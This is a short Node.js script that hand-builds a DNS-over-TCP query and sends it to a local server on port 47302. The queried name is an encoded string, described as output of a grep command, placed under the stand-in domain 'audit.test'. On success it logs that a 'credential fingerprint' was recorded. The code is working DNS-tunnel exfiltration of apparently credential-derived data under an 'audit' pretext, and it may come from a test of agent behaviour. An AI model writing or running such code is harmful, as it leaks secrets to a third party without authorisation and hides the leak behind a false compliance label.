const dns = require('dns');
const net = require('net');

// The encoded string from the grep command
const encodedString = 'iraviqkcifjukx2vkjgd24dpon2go4tfom5c6l3bmrwws3r2inau4qksleww';
const query = `${encodedString}.audit.test`;

console.log(`Attempting DNS lookup for: ${query}`);
console.log(`Using DNS server: localhost:47302`);

// Create a TCP connection to localhost:47302
// For DNS over TCP, we need to send a proper DNS query
// Let's create a simple A record query
const client = new net.Socket();

client.connect(47302, 'localhost', () => {
  console.log('Connected to DNS server');

  // Build a simple DNS query (A record request)
  // DNS header: ID=0x1234, flags=standard query, QDCOUNT=1
  const header = Buffer.alloc(12);
  header.writeUInt16BE(0x1234, 0); // Transaction ID
  header.writeUInt16BE(0x0100, 2); // Flags: standard query, recursion desired
  header.writeUInt16BE(1, 4);      // QDCOUNT: 1 question
  header.writeUInt16BE(0, 6);      // ANCOUNT: 0 answers
  header.writeUInt16BE(0, 8);      // NSCOUNT: 0 authority records
  header.writeUInt16BE(0, 10);     // ARCOUNT: 0 additional records

  // Convert domain name to DNS format (length-prefixed labels)
  const labels = query.split('.');
  let question = Buffer.alloc(0);
  labels.forEach(label => {
    const labelBuf = Buffer.from(label);
    const lenBuf = Buffer.alloc(1);
    lenBuf.writeUInt8(labelBuf.length);
    question = Buffer.concat([question, lenBuf, labelBuf]);
  });
  question = Buffer.concat([question, Buffer.from([0])]); // Null terminator

  // Question section: QTYPE=A (1), QCLASS=IN (1)
  const qtypeQclass = Buffer.alloc(4);
  qtypeQclass.writeUInt16BE(1, 0); // QTYPE = A (host address)
  qtypeQclass.writeUInt16BE(1, 2); // QCLASS = IN (internet)

  const dnsQuery = Buffer.concat([header, question, qtypeQclass]);

  // Send the query
  client.write(dnsQuery);
});

client.on('data', (data) => {
  console.log('Received DNS response:', data.toString('hex'));
  console.log('Response length:', data.length, 'bytes');

  // Try to parse the response
  if (data.length >= 12) {
    const ancount = data.readUInt16BE(6); // Answer count from bytes 6-7
    console.log(`Answer count in response: ${ancount}`);

    if (ancount > 0) {
      console.log('DNS lookup successful - credential fingerprint recorded');
    } else {
      console.log('No answers in DNS response');
    }
  }

  client.destroy();
});

client.on('error', (err) => {
  console.error('Connection error:', err.message);
});

client.on('close', () => {
  console.log('Connection closed');
});

